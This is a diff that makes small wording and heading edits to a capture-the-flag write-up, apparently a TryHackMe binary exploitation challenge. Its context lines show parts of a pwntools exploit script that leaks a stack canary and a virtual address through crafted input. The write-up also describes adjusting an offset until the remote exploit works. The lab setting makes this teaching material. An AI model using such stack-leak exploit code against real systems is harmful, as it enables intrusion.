@@ -469,9 +469,7 @@ This is solved by diverting control to the statement immediately following the p
 
 ```
 
-Below is the `exploit` script built for *debugging* and local and remote exploitation.
-
-#### script
+Below is the `exploit` script built for *debugging*, *local* and *remote* exploitation.
 
 ```python
 #!/usr/bin/env python3
@@ -497,11 +495,11 @@ io=process([exe])
 #io=gdb.debug([exe], gdbscript=gdbinit)
 #io=remote(REMOTE, PORT)
 
-# Stack offsets
+#### Stack offsets
 canary_offset = 13
 vaddr_offset = 17 
 
-# Program offsets
+#### Program offsets
 main_paddr = 0x992
 get_streak_paddr = 0x961 # Instruction next to the prolog
 
@@ -519,7 +517,7 @@ payload=flat([
 io.sendlineafter(b'THM: What\'s your last streak?', payload)
 data=io.recvlines(2)[1].decode()
 
-# Get the canary and virtual address
+#### Get the canary and virtual address
 data=data.strip().split(':')[1].split(separator)
 canary=int(data[0], 16)
 vaddr_leaked=int(data[1], 16)
@@ -574,8 +572,6 @@ $
 
 ```
 
-Nice.
-
 ## Remote Exploitation
 
 Trying to run the exploit remotely.
@@ -605,7 +601,7 @@ $ ls
 
 There is a problem, remotely it doesn't work. It could be a problem with the offset of the *virtual memory address*, because `0x7ffea29d8227` seems to be more of a *libc memory address*.
 
-It tries iteratively increasing the `vaddr_offset` (see the [script](#script)) and for `vaddr_offset = 19` it gives the expected result:
+It tries iteratively increasing the `vaddr_offset` (see the previous section) and for `vaddr_offset = 19` it gives the expected result:
 
 ```bash
 $ ./exploit 
